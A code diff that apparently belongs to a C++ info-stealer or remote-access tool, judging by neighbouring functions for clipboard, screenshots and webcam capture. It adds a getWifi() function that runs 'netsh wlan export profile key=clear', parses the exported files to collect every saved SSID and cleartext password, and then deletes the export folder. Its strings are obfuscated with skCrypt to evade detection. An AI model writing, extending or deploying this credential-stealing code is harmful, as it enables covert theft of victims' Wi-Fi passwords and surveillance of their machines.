@@ -351,6 +351,52 @@ string getClipboard() {
     return result;
 }
 
+string getWifi() {
+    bool directoryCreated = false;
+    if (!fs::is_directory(WIFI_PATH) || !fs::exists(WIFI_PATH)) {
+        fs::create_directory(WIFI_PATH);
+        directoryCreated = true;
+    }
+
+    exec(((string)skCrypt("netsh wlan export profile folder=\"") + WIFI_PATH + (string)skCrypt("\\\" key=clear && cls")).c_str());
+
+    vector<string> wifiFiles = split(exec(((string)skCrypt("dir /s /b /a-d ") + WIFI_PATH).c_str()), '\n');
+
+    string result = (string)skCrypt("");
+    bool first = true;
+
+    for (string wifi : wifiFiles) {
+        if (wifi.size() <= 4)
+            continue;
+
+        ifstream wifiFIle(wifi);
+        stringstream buffer;
+        buffer << wifiFIle.rdbuf();
+        wifiFIle.close();
+        string content = buffer.str();
+
+        if (first)
+            first = false;
+        else
+            result += skCrypt("\n");
+
+        result += skCrypt("SSID: ");
+        for (int i = content.find(skCrypt("<name>")) + 6; i < content.find(skCrypt("</name>")); i++)
+            result += content[i];
+        result += skCrypt("\n");
+
+        result += skCrypt("Password: ");
+        for (int i = content.find(skCrypt("<keyMaterial>")) + 13; i < content.find(skCrypt("</keyMaterial>")); i++)
+            result += content[i];
+        result += skCrypt("\n");
+    }
+
+    if (directoryCreated)
+        fs::remove_all((WIFI_PATH).c_str());
+
+    return result;
+}
+
 string getScreenshot() {
     string filename = TEMPFILE + (string)skCrypt(".bmp");
     string filename2 = TEMPFILE + (string)skCrypt(".jpg");
@@ -826,7 +872,7 @@ cleanup:
     }
 
     if (deleteFolder)
-        fs::remove(WEBCAM_PATH);
+        fs::remove_all(WEBCAM_PATH);
 
     return;
 }
